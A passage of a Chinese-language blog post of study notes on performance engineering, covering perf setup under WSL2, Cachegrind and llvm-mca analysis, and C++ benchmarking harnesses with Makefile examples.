<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install elfutils libunwind-dev libperl-dev liblzma-dev libzstd-dev libcap-dev libnuma-dev libbabeltrace-dev libpfm4-dev libtraceevent-dev </span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/microsoft/WSL2-Linux-Kernel --depth 1</span><br><span class="line"><span class="built_in">cd</span> WSL2-Linux-Kernel/tools/perf</span><br><span class="line">make -j8</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> perf /usr/local/bin</span><br></pre></td></tr></table></figure></div>
<p>然后我们准备一个cpp程序：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// g++ -O3 -march=native ./test.cpp -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n = <span class="number">10000000</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000000</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">binary_search</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) {</span><br><span class="line">        <span class="type">int</span> m = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[m] &gt;= x)</span><br><span class="line">            r = m;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            l = m + <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">        <span class="type">int</span> idx = <span class="built_in">binary_search</span>(a, a + n, <span class="built_in">rand</span>());</span><br><span class="line">        checksum += idx;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> checksum;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="built_in">srand</span>(chrono::steady_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>().<span class="built_in">count</span>());</span><br><span class="line">    <span class="built_in">setup</span>();</span><br><span class="line">    cout &lt;&lt; <span class="built_in">query</span>() &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>然后我们可以<code>perf stat ./test</code>
进行测试。但发现如上perf会显示如下错误，能够获取的信息很有限。之后看了<a class="link" href="https://www.scicoding.com/how-to-perform-perf-profiling-in-wsl2/">这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>发现可能wsl2就是不支持硬件计数器的，所以最好我们还是用vm中的完整linux系统来进行模拟。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313195628873.png" class="">
<p>有时候会出现如下错误：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Error:</span><br><span class="line">Access to performance monitoring and observability operations is limited.</span><br><span class="line">Consider adjusting /proc/sys/kernel/perf_event_paranoid setting to open</span><br><span class="line">access to performance monitoring and observability operations for processes</span><br><span class="line">without CAP_PERFMON, CAP_SYS_PTRACE or CAP_SYS_ADMIN Linux capability.</span><br><span class="line">More information can be found at 'Perf events and tool security' document:</span><br><span class="line">https://www.kernel.org/doc/html/latest/admin-guide/perf-security.html</span><br><span class="line">perf_event_paranoid setting is 4:</span><br><span class="line">  -1: Allow use of (almost) all events by all users</span><br><span class="line">      Ignore mlock limit after perf_event_mlock_kb without CAP_IPC_LOCK</span><br><span class="line">&gt;= 0: Disallow raw and ftrace function tracepoint access</span><br><span class="line">&gt;= 1: Disallow CPU event access</span><br><span class="line">&gt;= 2: Disallow kernel profiling</span><br><span class="line">To make the adjusted perf_event_paranoid setting permanent preserve it</span><br><span class="line">in /etc/sysctl.conf (e.g. kernel.perf_event_paranoid = &lt;setting&gt;)</span><br></pre></td></tr></table></figure></div>
<p>这是因为 <code>perf_event_paranoid</code>
级别过高，限制了非特权用户的访问。我们可以降低
<code>perf_event_paranoid</code> 级别来解决这个问题。</p>
<p><strong>1. 临时调整权限（仅对当前会话有效）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -1 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/perf_event_paranoid</span><br></pre></td></tr></table></figure></div>
<p>解释：</p>
<ul>
<li><code>-1</code> 允许所有用户访问几乎所有性能事件。</li>
<li>该设置 <strong>仅对当前会话有效</strong>，重启后会恢复默认值。</li>
</ul>
<p><strong>2. 永久修改 <code>perf_event_paranoid</code>
设置</strong></p>
<p>如果你希望每次启动系统时 <code>perf</code> 都能正常工作，可以修改
<strong><code>/etc/sysctl.conf</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"kernel.perf_event_paranoid = -1"</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/sysctl.conf</span><br><span class="line"><span class="built_in">sudo</span> sysctl -p  <span class="comment"># 立即生效</span></span><br></pre></td></tr></table></figure></div>
<p>这样每次重启后，<code>perf_event_paranoid</code> 都会自动设置为
<code>-1</code>。</p>
<p>正常的执行结果如下：</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313203855345.png" class="">
<p>还可以用<code>perf stat -e cache-references,cache-misses ./test</code>来查看缓存的引用数以及不命中率。更多的可查看的事件可以通过<code>perf list</code>列出来。常用的还有<code>perf record -g binary</code>记录数据，<code>perf report</code>查看数据。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313210543942.png" class="">
<p>还能够跟进具体的函数查看哪个指令花费的时间最多。从下图可发现我们的程序大部分时间都在等待比较结果并跳转。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313210218141.png" class="">
<h4 id="程序模拟program-simulation">程序模拟（Program Simulation）</h4>
<p>这类分析工具有许多不同的子类别，它们在模拟计算的不同方面有所区别。我们将重点关注<strong>缓存（caching）</strong>和<strong>分支预测（branch
prediction）</strong>，并使用 <strong>Cachegrind</strong>
进行分析。Cachegrind 是 <strong>Valgrind</strong>
的一个专门用于性能分析的组件，而 <strong>Valgrind</strong>
本身是一个广泛用于<strong>内存泄漏检测</strong>和<strong>内存调试</strong>的工具。我们可以通过这个工具清晰的看出缓存的命中率以及分支预测成功率。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/image-20250313212257762.png" class="">
<p><code>Cachegrind</code> 只模拟了第一个（D1 数据缓存，I1
指令缓存）和最后一个（LL，统一缓存）级别的缓存，这些特性是从系统中推断出来的。它并不限制你使用，可以通过命令行设置它们，例如，要模拟
<strong>L2
缓存</strong>，可以使用：<code>--LL=&lt;size&gt;,&lt;associativity&gt;,&lt;line size&gt;</code>。</p>
<p>到目前为止，似乎它只是让程序变慢了，并没有提供比
<code>perf stat</code>
更多的信息。为了从中获得更多信息，我们可以检查它默认输出的包含分析信息的特殊文件，该文件通常会以
<code>cachegrind.out.&lt;pid&gt;</code>
的形式保存在同一目录中。它是可读的，但应该通过 <code>cg_annotate</code>
命令来读取：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cg_annotate cachegrind.out.4159404 --show=Dr,D1mr,DLmr,Bc,Bcm</span><br></pre></td></tr></table></figure></div>
<p><code>Dr</code> 代表数据读取，<code>D1mr</code> 代表 D1
缓存未命中，<code>DLmr</code> 代表 LL 缓存未命中，<code>Bc</code>
代表分支计数，<code>Bcm</code> 代表分支误预测计数。</p>
<p>首先会展示出缓存系统的一些参数：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">I1 cache:         32768 B, 64 B, 8-way associative</span><br><span class="line">D1 cache:         49152 B, 64 B, 12-way associative</span><br><span class="line">LL cache:         25165824 B, 64 B, 12-way associative</span><br></pre></td></tr></table></figure></div>
<p>接下来，它会输出一个类似 <code>perf report</code>
的每个函数的摘要：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Dr                   D1mr                 DLmr               Bc                   Bcm                   file:function</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">233,222,628 (24.19%) 120,907,934 (93.42%) 9,088,287 (88.93%) 476,445,256 (46.38%) 126,804,147 (55.30%)  /usr/include/c++/11/bits/stl_algobase.h:query()</span><br><span class="line">  2,974,063 ( 0.31%)         545 ( 0.00%)         1 ( 0.00%) 294,308,292 (28.65%)  90,370,039 (39.41%)  /usr/include/c++/11/bits/stl_algo.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line">160,000,000 (16.59%)          30 ( 0.00%)        22 ( 0.00%)  99,354,839 ( 9.67%)   1,290,334 ( 0.56%)  ./stdlib/./stdlib/random_r.c:random_r</span><br><span class="line">160,000,000 (16.59%)           2 ( 0.00%)         2 ( 0.00%)  80,000,000 ( 7.79%)           3 ( 0.00%)  ./stdlib/./stdlib/random.c:random</span><br><span class="line">290,352,982 (30.11%)   7,876,199 ( 6.09%)   890,954 ( 8.72%)           0                    0           /usr/include/c++/11/bits/predefined_ops.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line">          0                    0                  0                    0                    0           /usr/include/c++/11/bits/stl_iterator_base_funcs.h:query()</span><br><span class="line">  9,999,999 ( 1.04%)     624,243 ( 0.48%)   231,812 ( 2.27%)  46,870,617 ( 4.56%)  10,811,473 ( 4.72%)  /usr/include/c++/11/bits/stl_algo.h:setup()</span><br><span class="line"> 20,000,004 ( 2.07%)           2 ( 0.00%)         2 ( 0.00%)  10,000,001 ( 0.97%)           9 ( 0.00%)  /mnt/d/code/C++/./test.cpp:query()</span><br><span class="line"> 20,000,000 ( 2.07%)           0                  0                    0                    0           ./stdlib/./stdlib/rand.c:rand</span><br><span class="line">          0                    0                  0                    0                    0           /usr/include/c++/11/bits/move.h:void std::__introsort_loop&lt;int*, long, __gnu_cxx::__ops::_Iter_less_iter&gt;(int*, int*, long, __gnu_cxx::__ops::_Iter_less_iter) [clone .isra.0]</span><br><span class="line"> 10,000,008 ( 1.04%)           3 ( 0.00%)         2 ( 0.00%)  10,000,001 ( 0.97%)           7 ( 0.00%)  /mnt/d/code/C++/./test.cpp:setup()</span><br><span class="line"> 36,870,615 ( 3.82%)           0                  0                    0                    0           /usr/include/c++/11/bits/predefined_ops.h:setup()</span><br><span class="line"> 20,001,490 ( 2.07%)         155 ( 0.00%)        45 ( 0.00%)         162 ( 0.00%)          46 ( 0.00%)  ???:???</span><br><span class="line">          0                    0                  0           10,000,000 ( 0.97%)           3 ( 0.00%)  /usr/include/c++/11/bits/stl_algo.h:query()</span><br></pre></td></tr></table></figure></div>
<p>这样我们就可以分析是在什么阶段出了很多 <strong>L1 缓存未命中</strong>
和
<strong>分支误预测</strong>。这是<strong>perf</strong>不具有的功能。</p>
<p><code>Cachegrind</code>
还有一个非常好的特性是对源代码的逐行注解。为此，你需要用调试信息（<code>-g</code>）编译程序，并且显式告诉
<code>cg_annotate</code> 需要注解哪些源文件，或者直接使用
<code>--auto=yes</code>
选项，让它自动注解所有它能访问到的文件（包括标准库的源代码）。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -O3 -march=native ./test.cpp -g -o <span class="built_in">test</span></span><br><span class="line">valgrind --tool=cachegrind --branch-sim=<span class="built_in">yes</span> --cachegrind-out-file=cachegrind.out ./test</span><br><span class="line">cg_annotate cachegrind.out --auto=<span class="built_in">yes</span> --show=Dr,D1mr,DLmr,Bc,Bcm</span><br></pre></td></tr></table></figure></div>
<p>不幸的是，<code>Cachegrind</code>
只追踪内存访问和分支。当瓶颈是由其他因素引起时，我们需要使用其他模拟工具进行分析。</p>
<h4 id="机器码分析">机器码分析</h4>
<p>主要用的工具是<code>llvm-mca</code>，我们将以数组求和作为简单的例子进行分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">    addl (%rax), %edx</span><br><span class="line">    addq $4, %rax</span><br><span class="line">    cmpq %rcx, %rax</span><br><span class="line">    jne loop</span><br></pre></td></tr></table></figure></div>
<p><strong>llvm-mca 的分析结果（以 Skylake 微架构为例）</strong></p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">Iterations:        100</span><br><span class="line">Instructions:      400</span><br><span class="line">Total Cycles:      108</span><br><span class="line">Total uOps:        500</span><br><span class="line"></span><br><span class="line">Dispatch Width:    6</span><br><span class="line">uOps Per Cycle:    4.63</span><br><span class="line">IPC:               3.70</span><br><span class="line">Block RThroughput: 0.8</span><br></pre></td></tr></table></figure></div>
<p><strong>运行信息：</strong></p>
<ul>
<li><code>llvm-mca</code> 模拟执行了 100 次循环，总共执行了 400
条指令，用时 108 个周期。</li>
<li>这相当于每个周期平均执行约 3.7 条指令（IPC，即每周期指令数）。</li>
<li>CPU 理论上每周期最多执行 6 条指令（调度宽度）。</li>
<li>每条指令的平均吞吐量为 0.8 周期。</li>
</ul>
<p><strong>指令信息：</strong></p>
<ul>
<li>每条指令的细节信息，包括它分解成的微操作数（uOps）、延迟、吞吐量等：</li>
</ul>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">[1]    [2]    [3]    [4]    [5]    [6]    Instructions:</span><br><span class="line">2      6     0.50    *                   addl    (%rax), %edx</span><br><span class="line">1      1     0.25                        addq    $4, %rax</span><br><span class="line">1      1     0.25                        cmpq    %rcx, %rax</span><br><span class="line">1      1     0.50                        jne     -11</span><br></pre></td></tr></table></figure></div>
<p>每条指令有：</p>
<ul>
<li><strong>uOps</strong>：指令分解成的微操作数。</li>
<li><strong>延迟</strong>：执行该指令所需的周期数。</li>
<li><strong>吞吐量</strong>：指令在多个副本可以同时执行时的平均周期数。</li>
</ul>
<ol start="3" type="1">
<li><strong>资源压力图：</strong> <code>llvm-mca</code>
还会输出每条指令使用的CPU资源的压力情况。如下所示：</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Resource pressure by instruction:</span><br><span class="line">[0]    [1]    [2]    [3]    [4]    [5]    [6]    [7]    [8]    [9]    Instructions:</span><br><span class="line">-      -     0.01   0.98   0.50   0.50    -      -     0.01    -     addl (%rax), %edx</span><br><span class="line">-      -      -      -      -      -      -     0.01   0.99    -     addq $4, %rax</span><br><span class="line">-      -      -     0.01    -      -      -     0.99    -      -     cmpq %rcx, %rax</span><br><span class="line">-      -     0.99    -      -      -      -      -     0.01    -     jne -11</span><br></pre></td></tr></table></figure></div>
<ul>
<li>该图显示了每条指令在不同执行端口上的资源使用情况。</li>
<li>通过查看这些统计信息，可以诊断出哪些指令在执行过程中遇到了瓶颈，通常是由于资源争用导致的结构性危害。</li>
</ul>
<h4 id="基准测试">基准测试</h4>
<p>在软件工程中，大多数优秀的实践都涉及到如何缩短开发周期：你希望更快地编译软件（构建系统）、尽早捕获错误（静态分析、持续集成）、一有新版本就立即发布（持续部署），并且快速响应用户反馈（敏捷开发）。性能工程也是如此。如果做得正确，它应该类似于一个循环：</p>
<ol type="1">
<li>运行程序并收集度量指标。</li>
<li>找出瓶颈所在。</li>
<li>消除瓶颈，回到第 1 步。</li>
</ol>
<p>编写基准测试代码有几种方法。可能最常见的方法是将要比较的多种同语言实现放在同一个文件中，在
<code>main</code>
函数中分别调用它们，并在同一个源文件中计算你想要的所有度量指标。</p>
<p>这种方法的缺点是你需要编写大量的样板代码，并且为每个实现重复这些代码，但可以通过元编程来部分消除这一点。例如，当你正在基准测试多个
<code>gcd</code> 实现时，可以通过这个高阶函数大大减少基准测试代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>, T = <span class="number">1e9</span> / N;</span><br><span class="line"><span class="type">int</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">timeit</span><span class="params">(<span class="type">int</span> (*f)(<span class="type">int</span>, <span class="type">int</span>))</span> </span>{</span><br><span class="line">    <span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; T; t++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            checksum ^= <span class="built_in">f</span>(a[i], b[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checksum: %d\n"</span>, checksum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f ns per call\n"</span>, <span class="number">1e9</span> * seconds / N / T);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>(), b[i] = <span class="built_in">rand</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">timeit</span>(std::gcd);</span><br><span class="line">    <span class="built_in">timeit</span>(my_gcd);</span><br><span class="line">    <span class="built_in">timeit</span>(my_another_gcd);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这种方法具有非常低的开销，可以让你运行更多的实验并从中获得更准确的结果。你仍然需要执行一些重复的操作，但它们可以通过框架自动化，Google
的 <code>benchmark</code> 库是 C++
中最流行的选择。一些编程语言也提供了方便的内置基准工具，例如 Python 的
<code>timeit</code> 函数和 Julia 的 <code>@benchmark</code> 宏。</p>
<h5 id="分离实现代码">分离实现代码</h5>
<p>在 C/C++ 中，通常可以通过创建一个单一的头文件（例如
<code>gcd.hh</code>）来定义算法接口，并将所有的基准测试代码放在
<code>main</code> 函数中。这种做法的基本结构如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcd.hh</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>; <span class="comment">// 需要实现</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"gcd.hh"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span>, T = <span class="number">1e9</span> / N;</span><br><span class="line">    <span class="type">int</span> a[N], b[N];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        a[i] = <span class="built_in">rand</span>(), b[i] = <span class="built_in">rand</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; T; t++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            checksum += <span class="built_in">gcd</span>(a[i], b[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> seconds = <span class="built_in">float</span>(<span class="built_in">clock</span>() - start) / CLOCKS_PER_SEC;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, checksum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f ns per call\n"</span>, <span class="number">1e9</span> * seconds / N / T);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在上面的代码中，<code>gcd.hh</code> 头文件只声明了 <code>gcd</code>
函数，而其具体实现被写在不同的源文件中。这样可以让你在不修改主代码的情况下，测试不同版本的
<code>gcd</code> 算法。</p>
<p><strong>不同版本的实现</strong></p>
<p>每个算法版本的实现（例如，<code>v1.cc</code>、<code>v2.cc</code>
等）都可以包含这个头文件，并根据需要实现 <code>gcd</code>
函数。例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v1.cc</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"gcd.hh"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这种方法使得你可以在命令行中指定某个版本的算法进行基准测试，而无需修改任何源代码。你只需在不同的实现文件之间切换或通过编译时参数选择实现版本。</p>
<p><strong>动态调整参数</strong></p>
<p>为了提高灵活性，可以通过命令行参数来传递运行时的参数。例如，你可以根据命令行参数设置数据集大小：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>{</span><br><span class="line">    <span class="type">int</span> N = (argc &gt; <span class="number">1</span> ? <span class="built_in">atoi</span>(argv[<span class="number">1</span>]) : <span class="number">1e6</span>);  <span class="comment">// 通过命令行参数设置 N 的值</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> T = <span class="number">1e9</span> / N;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基准测试代码...</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>这样，你就能够在不同的实验中灵活地调整输入数据的规模而无需重新编写代码。</p>
<p><strong>使用编译时常量</strong></p>
<p>另一种方法是使用 C 风格的全局宏定义，并通过编译时的 <code>-D</code>
标志来传递参数。例如，设置 <code>N</code> 的值：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// gcd.hh</span><br><span class="line"><span class="comment">#ifndef N</span></span><br><span class="line"><span class="comment">#define N 1000000</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">const int T = 1e9 / N;</span><br></pre></td></tr></table></figure></div>
<p>然后在编译时使用 <code>-D N=2000000</code> 来设置 <code>N</code>
的值：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -D N=2000000 -o main main.cpp v1.cc</span><br></pre></td></tr></table></figure></div>
<p>这种方法的优势是能够利用编译时常量，这对于某些算法的性能优化非常有帮助。然而，缺点是每次更改参数时需要重新编译程序，这可能会增加收集多个参数值的度量数据所需的时间。</p>
<h5 id="makefile使用">Makefile使用</h5>
<p>为了提高编译速度，可以将源文件拆分，并使用像Make这样的缓存构建系统。Make是一个强大的工具，可以通过自动化编译过程来加速构建和测试循环。以下是一个常用的Makefile示例，适用于C++项目的构建：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">compile = g++ -std=c++17 -O3 -march=native -Wall</span><br><span class="line"></span><br><span class="line"><span class="section">%: %.cc gcd.hh</span></span><br><span class="line">	<span class="variable">$(compile)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span> </span><br><span class="line"></span><br><span class="line"><span class="section">%.s: %.cc gcd.hh</span></span><br><span class="line">	<span class="variable">$(compile)</span> -S -fverbose-asm <span class="variable">$&lt;</span> -o <span class="variable">$@</span>  <span class="comment"># 生成汇编文件</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.run: %  # 运行文件</span></span><br><span class="line">	@./<span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: %.run  # 声明run为伪目标</span></span><br></pre></td></tr></table></figure></div>
<p><strong>解释</strong></p>
<ul>
<li><code>compile</code>: 定义了一个编译命令，使用 <code>g++</code>
编译器，启用了C++17标准，开启了最大优化
<code>-O3</code>，指定了本地体系结构优化
<code>-march=native</code>，并显示警告信息 <code>-Wall</code>。</li>
<li><code>%.cc</code> 到
<code>gcd.hh</code>：编译源文件（<code>.cc</code>）并链接到一个可执行文件（默认文件名）。<code>$&lt;</code>表示当前依赖文件（在这种情况下是源代码文件）。</li>
<li><code>%.s</code>：为源文件生成汇编代码，使用了 <code>-S</code> 和
<code>-fverbose-asm</code>，生成详细的汇编输出。<code>$@</code>是目标文件的名称。</li>
<li><code>%.run</code>：通过 <code>@./$&lt;</code>
运行生成的可执行文件，<code>$&lt;</code> 表示编译后的目标文件。</li>
<li><code>.PHONY</code>:
用于声明伪目标，确保即使存在同名文件，Make也能正常执行。</li>
</ul>
<p>使用这个Makefile，你可以通过简单的命令来编译和运行程序，例如：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">make example      <span class="comment"># 编译example.cc为可执行文件</span></span><br><span class="line">make example.run  <span class="comment"># 运行example</span></span><br></pre></td></tr></table></figure></div>
<p><strong>与性能分析结合</strong></p>
<p>你还可以在Makefile中加入性能分析的脚本。例如，通过
<code>perf stat</code> 来自动化性能剖析：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">%.perf: %</span></span><br><span class="line">	@perf stat ./<span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure></div>
<p>这样，你就可以运行 <code>make example.perf</code>
来获取运行的性能统计数据。</p>
<h5 id="jupyter-notebooks使用">Jupyter Notebooks使用</h5>
<p>为了进一步加速高层次的分析，你可以在Jupyter
Notebook中整理你的脚本并生成图表。可以通过编写一个基准测试函数来自动化测试不同算法实现的性能：</p>
